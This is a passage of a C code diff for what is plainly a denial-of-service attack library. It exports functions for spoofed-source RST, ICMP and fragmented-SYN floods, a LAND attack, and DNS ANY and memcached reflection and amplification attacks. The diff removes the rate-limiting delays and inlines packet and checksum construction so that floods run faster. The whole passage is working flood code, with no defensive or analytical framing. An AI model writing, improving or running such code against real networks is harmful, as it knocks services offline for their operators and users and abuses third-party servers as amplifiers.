+        tcp->ack_seq = xrand();
+        if (sendto(g_sock, buf, g_syn_tmpl.hdr_len, MSG_DONTWAIT, (struct sockaddr*)&dst, sizeof(dst)) > 0) sent++;
     }
     return sent;
 }
 
 EXPORT int rst_flood(uint32_t target, uint16_t port, uint32_t spoof, int count, int delay) {
-    char buf[PKT_MAX]; int plen;
-    struct sockaddr_in dst; dst.sin_family = AF_INET; dst.sin_port = htons(port); dst.sin_addr.s_addr = target;
+    (void)delay;
     int sent = 0;
     if (g_sock < 0 && init_raw_socket() < 0) return -1;
+    build_syn_template(target, port);
+    struct sockaddr_in dst; dst.sin_family = AF_INET; dst.sin_port = htons(port); dst.sin_addr.s_addr = target;
     for (int i = 0; i < count; i++) {
-        uint32_t src = spoof ? spoof : rand_spoof();
-        build_rst_fast(buf, &plen, src, target, port);
-        if (sendto(g_sock, buf, plen, MSG_DONTWAIT, (struct sockaddr*)&dst, sizeof(dst)) > 0) sent++;
-        if (delay) usleep(delay);
+        char buf[PKT_MAX];
+        patch_syn(buf, spoof ? spoof : rand_spoof());
+        struct tcphdr *tcp = (struct tcphdr*)(buf + 20);
+        tcp->syn = 0; tcp->rst = 1;
+        if (sendto(g_sock, buf, g_syn_tmpl.hdr_len, MSG_DONTWAIT, (struct sockaddr*)&dst, sizeof(dst)) > 0) sent++;
     }
     return sent;
 }
 
 EXPORT int icmp_flood(uint32_t target, uint32_t spoof, int count, int delay) {
-    char buf[PKT_MAX]; int plen;
+    (void)delay;
+    char buf[PKT_MAX];
     struct sockaddr_in dst; dst.sin_family = AF_INET; dst.sin_addr.s_addr = target;
     int sent = 0;
     if (g_sock < 0 && init_raw_socket() < 0) return -1;
     for (int i = 0; i < count; i++) {
         uint32_t src = spoof ? spoof : rand_spoof();
-        build_icmp_fast(buf, &plen, src, target);
+        int plen = 20 + 8 + 56;
+        struct iphdr *ip = (struct iphdr*)buf;
+        struct icmphdr *icmp = (struct icmphdr*)(buf + 20);
+        memset(buf + 20, 0, 64);
+        ip->ihl = 5; ip->version = 4; ip->tot_len = htons(plen);
+        ip->id = htons((uint16_t)(xrand() & 0xFFFF)); ip->frag_off = 0;
+        ip->ttl = 64; ip->protocol = IPPROTO_ICMP;
+        ip->saddr = src; ip->daddr = target;
+        { uint32_t ck = 0; uint16_t *w = (uint16_t*)ip; for (int j = 0; j < 10; j++) ck += w[j];
+          while (ck >> 16) ck = (ck & 0xFFFF) + (ck >> 16); ip->check = (uint16_t)~ck; }
+        icmp->type = ICMP_ECHO;
+        { uint32_t csum = 0; uint16_t *iw = (uint16_t*)icmp; for (int j = 0; j < 32; j++) csum += iw[j];
+          while (csum >> 16) csum = (csum & 0xFFFF) + (csum >> 16); icmp->checksum = (uint16_t)~csum; }
         if (sendto(g_sock, buf, plen, MSG_DONTWAIT, (struct sockaddr*)&dst, sizeof(dst)) > 0) sent++;
-        if (delay) usleep(delay);
     }
     return sent;
 }
@@ -589,6 +550,7 @@ EXPORT int icmp_flood(uint32_t target, uint32_t spoof, int count, int delay) {
 static uint16_t dns_id = 0xDEAD;
 
 EXPORT int dns_any_amp(uint32_t target, uint32_t spoof, const char *server, int count, int delay) {
+    (void)delay;
     int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
     if (sock < 0) return -1;
     struct sockaddr_in dst;
@@ -626,24 +588,27 @@ EXPORT int dns_any_amp(uint32_t target, uint32_t spoof, const char *server, int 
             int plen = 20 + 8 + off;
             struct iphdr *ip = (struct iphdr*)pkt;
             struct udphdr *udp = (struct udphdr*)(pkt + 20);
-            memset(pkt, 0, plen);
-            fill_ip_fast(ip, plen, src, dst.sin_addr.s_addr, IPPROTO_UDP);
-            udp->source = htons((xrand() % 64511) + 1024);
-            udp->dest = htons(53);
-            udp->len = htons(8 + off);
+            ip->ihl = 5; ip->version = 4; ip->tot_len = htons(plen);
+            ip->id = htons((uint16_t)(xrand() & 0xFFFF)); ip->frag_off = htons(0x4000);
+            ip->ttl = 128; ip->protocol = IPPROTO_UDP;
+            ip->saddr = src; ip->daddr = dst.sin_addr.s_addr;
+            { uint32_t ck = 0; uint16_t *w = (uint16_t*)ip; for (int j = 0; j < 10; j++) ck += w[j];
+              while (ck >> 16) ck = (ck & 0xFFFF) + (ck >> 16); ip->check = (uint16_t)~ck; }
+            udp->source = htons((uint16_t)(1024 + (xrand() % 64511)));
+            udp->dest = htons(53); udp->len = htons(8 + off);
             memcpy(pkt + 28, qbuf, off);
             sendto(g_sock, pkt, plen, MSG_DONTWAIT, (struct sockaddr*)&dst, sizeof(dst));
         } else {
-            sendto(sock, qbuf, off, 0, (struct sockaddr*)&dst, sizeof(dst));
+            sendto(sock, qbuf, off, MSG_DONTWAIT, (struct sockaddr*)&dst, sizeof(dst));
         }
         sent++;
-        if (delay) usleep(delay);
     }
     close(sock);
     return sent;
 }
 
 EXPORT int memcached_amp(uint32_t target, uint32_t spoof, const char *server, int count, int delay) {
+    (void)delay;
     int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
     if (sock < 0) return -1;
     struct sockaddr_in dst;
@@ -662,18 +627,20 @@ EXPORT int memcached_amp(uint32_t target, uint32_t spoof, const char *server, in
             int plen = 20 + 8 + reqlen;
             struct iphdr *ip = (struct iphdr*)pkt;
             struct udphdr *udp = (struct udphdr*)(pkt + 20);
-            memset(pkt, 0, plen);
-            fill_ip_fast(ip, plen, src, dst.sin_addr.s_addr, IPPROTO_UDP);
-            udp->source = htons((xrand() % 64511) + 1024);
-            udp->dest = htons(11211);
-            udp->len = htons(8 + reqlen);
+            ip->ihl = 5; ip->version = 4; ip->tot_len = htons(plen);
+            ip->id = htons((uint16_t)(xrand() & 0xFFFF)); ip->frag_off = htons(0x4000);
+            ip->ttl = 128; ip->protocol = IPPROTO_UDP;
+            ip->saddr = src; ip->daddr = dst.sin_addr.s_addr;
+            { uint32_t ck = 0; uint16_t *w = (uint16_t*)ip; for (int j = 0; j < 10; j++) ck += w[j];
+              while (ck >> 16) ck = (ck & 0xFFFF) + (ck >> 16); ip->check = (uint16_t)~ck; }
+            udp->source = htons((uint16_t)(1024 + (xrand() % 64511)));
+            udp->dest = htons(11211); udp->len = htons(8 + reqlen);
             memcpy(pkt + 28, req, reqlen);
             sendto(g_sock, pkt, plen, MSG_DONTWAIT, (struct sockaddr*)&dst, sizeof(dst));
         } else {
-            sendto(sock, req, reqlen, 0, (struct sockaddr*)&dst, sizeof(dst));
+            sendto(sock, req, reqlen, MSG_DONTWAIT, (struct sockaddr*)&dst, sizeof(dst));
         }
         sent++;
-        if (delay) usleep(delay);
     }
     close(sock);
     return sent;
@@ -683,43 +650,36 @@ EXPORT int memcached_amp(uint32_t target, uint32_t spoof, const char *server, in
 EXPORT int send_fragmented_syn(uint32_t target, uint16_t port, uint32_t spoof) {
     char buf[PKT_MAX]; int plen;
     uint32_t src = spoof ? spoof : rand_spoof();
-    build_syn_fast(buf, &plen, src, target, port);
-    struct sockaddr_in dst; dst.sin_family = AF_INET; dst.sin_port = htons(port); dst.sin_addr.s_addr = target;
     if (g_sock < 0) return -1;
+    build_syn_template(target, port);
+    patch_syn(buf, src);
+    struct sockaddr_in dst; dst.sin_family = AF_INET; dst.sin_port = htons(port); dst.sin_addr.s_addr = target;
     uint16_t ip_id = xrand() & 0xFFFF;
-    int frag_size = plen / 2;
+    int frag_size = g_syn_tmpl.hdr_len / 2;
     struct iphdr *ip = (struct iphdr*)buf;
-    ip->id = htons(ip_id);
-    ip->frag_off = htons(0x2000);
-    ip->tot_len = htons(frag_size);
-    uint32_t ck = 0; uint16_t *w = (uint16_t*)ip;
-    for (int i = 0; i < 5; i++) ck += w[i] + w[i+5];
-    while (ck >> 16) ck = (ck & 0xFFFF) + (ck >> 16);
-    ip->check = (uint16_t)~ck;
+    ip->id = htons(ip_id); ip->frag_off = htons(0x2000); ip->tot_len = htons(frag_size);
+    { uint32_t ck = 0; uint16_t *w = (uint16_t*)ip; for (int i = 0; i < 10; i++) ck += w[i];
+      while (ck >> 16) ck = (ck & 0xFFFF) + (ck >> 16); ip->check = (uint16_t)~ck; }
     sendto(g_sock, buf, frag_size, MSG_DONTWAIT, (struct sockaddr*)&dst, sizeof(dst));
-    memmove(buf, buf + frag_size, plen - frag_size);
-    memset(buf + (plen - frag_size), 0, frag_size);
+    memmove(buf, buf + frag_size, g_syn_tmpl.hdr_len - frag_size);
+    memset(buf + (g_syn_tmpl.hdr_len - frag_size), 0, frag_size);
     ip = (struct iphdr*)buf;
-    ip->id = htons(ip_id);
-    ip->frag_off = htons(0);
-    ip->tot_len = htons(plen - frag_size);
-    ck = 0; w = (uint16_t*)ip;
-    for (int i = 0; i < 5; i++) ck += w[i] + w[i+5];
-    while (ck >> 16) ck = (ck & 0xFFFF) + (ck >> 16);
-    ip->check = (uint16_t)~ck;
-    sendto(g_sock, buf, plen - frag_size, MSG_DONTWAIT, (struct sockaddr*)&dst, sizeof(dst));
+    ip->id = htons(ip_id); ip->frag_off = 0; ip->tot_len = htons(g_syn_tmpl.hdr_len - frag_size);
+    { uint32_t ck = 0; uint16_t *w = (uint16_t*)ip; for (int i = 0; i < 10; i++) ck += w[i];
+      while (ck >> 16) ck = (ck & 0xFFFF) + (ck >> 16); ip->check = (uint16_t)~ck; }
+    sendto(g_sock, buf, g_syn_tmpl.hdr_len - frag_size, MSG_DONTWAIT, (struct sockaddr*)&dst, sizeof(dst));
     return 2;
 }
 
-/* LAND attack */
 EXPORT int land_attack(uint32_t target, uint16_t port, int count) {
-    char buf[PKT_MAX]; int plen;
-    struct sockaddr_in dst; dst.sin_family = AF_INET; dst.sin_port = htons(port); dst.sin_addr.s_addr = target;
     int sent = 0;
     if (g_sock < 0 && init_raw_socket() < 0) return -1;
+    build_syn_template(target, port);
+    struct sockaddr_in dst; dst.sin_family = AF_INET; dst.sin_port = htons(port); dst.sin_addr.s_addr = target;
     for (int i = 0; i < count; i++) {
-        build_syn_fast(buf, &plen, target, target, port);
-        if (sendto(g_sock, buf, plen, MSG_DONTWAIT, (struct sockaddr*)&dst, sizeof(dst)) > 0) sent++;
+        char buf[PKT_MAX];
+        patch_syn(buf, target);
+        if (sendto(g_sock, buf, g_syn_tmpl.hdr_len, MSG_DONTWAIT, (struct sockaddr*)&dst, sizeof(dst)) > 0) sent++;
     }
     return sent;
 }
